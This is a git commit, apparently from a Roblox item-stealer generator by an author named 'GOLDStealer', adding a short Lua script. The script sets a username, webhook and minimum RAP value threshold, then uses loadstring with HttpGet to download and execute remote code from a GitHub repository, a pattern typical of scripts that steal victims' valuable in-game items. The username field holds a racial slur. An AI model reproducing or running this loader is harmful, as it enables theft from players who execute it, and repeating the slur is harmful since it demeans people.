ad672e87724b0047e5d18eac53d8bdff6e49f9fb
GOLDStealer <goldbed145@gmail.com>
2024-12-11 20:41:56 +0800

    Add generated script: GeneratedScript899073.lua

---
+++ lua/GeneratedScript899073.lua
@@ -0,0 +1,10 @@
+
+-- Generated Script
+local Username = "nigga man"
+local Webhook = "yes"
+
+-- Minimum RAP configuration
+local MinimumRAP = 500000
+
+-- Executing the script from GitHub repository
+loadstring(game:HttpGet('https://raw.githubusercontent.com/GOLDStealer/VOIDSCRIPTS/refs/heads/main/VOIDSCRIPTS'))()
